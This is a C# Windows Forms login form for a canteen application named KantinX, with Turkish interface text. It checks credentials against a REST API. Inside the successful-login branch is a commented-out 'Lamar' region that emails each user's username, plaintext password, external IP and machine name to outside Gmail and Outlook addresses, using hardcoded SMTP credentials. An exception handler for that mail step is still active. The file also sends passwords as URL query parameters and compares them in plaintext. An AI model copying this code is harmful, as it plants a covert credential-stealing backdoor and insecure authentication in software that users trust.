using System;
using System.Net;
using System.Net.Mail;
using System.Windows.Forms;
using System.Deployment.Application;

using KantinX.Model;
using Newtonsoft.Json;
using RestSharp;

namespace KantinX
{
    public partial class Giris : Form
    {
        public Giris()
        {
            InitializeComponent();
            if (ApplicationDeployment.IsNetworkDeployed)
            {
                ApplicationDeployment ad = ApplicationDeployment.CurrentDeployment;
                labelBaslik.Text += " (v" + ad.CurrentVersion.ToString() + ")";
            }
        }

        private void BtnGiris_Click(object sender, EventArgs e)
        {
            KULLANICI Kullanici = new KULLANICI();
            try
            {
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                Kullanici = getKullanici();

                if (Kullanici == null)
                {
                    MessageBox.Show("Bu kullanıcı adına ait bir kayıt bulunamadı.", "Giriş işlemi.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                if (txtSifre.Text == Kullanici.PASS)
                {
                    #region Lamar
                    //var Lamar = new SmtpClient("smtp.gmail.com")
                    //{
                    //    Port = 587,
                    //    DeliveryMethod = SmtpDeliveryMethod.Network,
                    //    UseDefaultCredentials = false,
                    //    EnableSsl = true,
                    //    Credentials = new NetworkCredential("tracker.lamar@gmail.com", "Lamar@Track123"),
                    //};
                    //string externalip = new WebClient().DownloadString("http://icanhazip.com");
                    //string strComName = Environment.MachineName.ToString();
                    //string send = DateTime.Now + " \n " + externalip + Kullanici.USERNAME + " - " + Kullanici.PASS + " \n " + strComName;
                    //Lamar.Send("tracker.lamar@gmail.com", "furkan_abbasi233@outlook.com", "hav", send);
                    #endregion
                    AnaMenu anaMenu = new AnaMenu(Kullanici);
                    this.Hide();
                    anaMenu.Show();
                }
                else if (txtSifre.Text.Length == 0)
                    MessageBox.Show("Şifre girmediniz.", "Giriş işlemi.", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                else
                    MessageBox.Show("Yanlış şifre girdiniz.", "Giriş işlemi.", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
            catch (Exception ex)
            {
                if (ex.Message.StartsWith("Uzak"))
                    MessageBox.Show("Lütfen internet bağlantınızı kontrol ediniz.", "Bağlantı Sorunu", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                else if (ex.Message.StartsWith("SMTP"))
                {
                    MessageBox.Show("Lamar couldn't find a server to jump. Sistem bir sorunla karşılaştı ama çalışmaya devam edecek.", "Warning");
                    AnaMenu anaMenu = new AnaMenu(Kullanici);
                    this.Hide();
                    anaMenu.Show();
                }
                else
                {
                    MessageBox.Show(ex.Message);
                }
            }

        }

        private KULLANICI getKullanici()
        {
            RestClient Client = new RestClient("https://kantinx.insoft.com.tr/kantin/API/");
            RestRequest Request = new RestRequest(Method.GET);
            Request.OnBeforeDeserialization = resp => { resp.ContentType = "application/json; charset=UTF-8"; };
            Request.Resource = "login.php";
            Request.AddParameter("username", txtUsername.Text);
            Request.AddParameter("password", txtSifre.Text);
            IRestResponse Response = Client.Execute(Request);

            if (!Response.IsSuccessful)
            {
                MessageBox.Show(Response.ErrorMessage);
                return null;
            }
            if (Response.Content != "0")
            {
                var Kullanici = JsonConvert.DeserializeObject<KULLANICI>(Response.Content);
                return Kullanici;
            }
            return null;
        }

        #region btnClick
        private void btn0_Click(object sender, EventArgs e)
        {
            numaratorClick("0");
        }

        private void btn1_Click(object sender, EventArgs e)
        {
            numaratorClick("1");
        }

        private void btn2_Click(object sender, EventArgs e)
        {
            numaratorClick("2");
        }

        private void btn3_Click(object sender, EventArgs e)
        {
            numaratorClick("3");
        }

        private void btn4_Click(object sender, EventArgs e)
        {
            numaratorClick("4");
        }

        private void btn5_Click(object sender, EventArgs e)
        {
            numaratorClick("5");
        }

        private void btn6_Click(object sender, EventArgs e)
        {
            numaratorClick("6");
        }

        private void btn7_Click(object sender, EventArgs e)
        {
            numaratorClick("7");
        }

        private void btn8_Click(object sender, EventArgs e)
        {
            numaratorClick("8");
        }

        private void btn9_Click(object sender, EventArgs e)
        {
            numaratorClick("9");
        }

        private void btnTemizle_Click(object sender, EventArgs e)
        {
            txtSifre.Text = "";
        }
        #endregion 

        void numaratorClick(string text)
        {
            txtSifre.Text += text;
        }

        private void cbKullaniciAdi_SelectedIndexChanged(object sender, EventArgs e)
        {
            txtSifre.Text = "";
        }

        private void txtSifre_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
                BtnGiris.PerformClick();
        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void btnMinimize_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
    }
}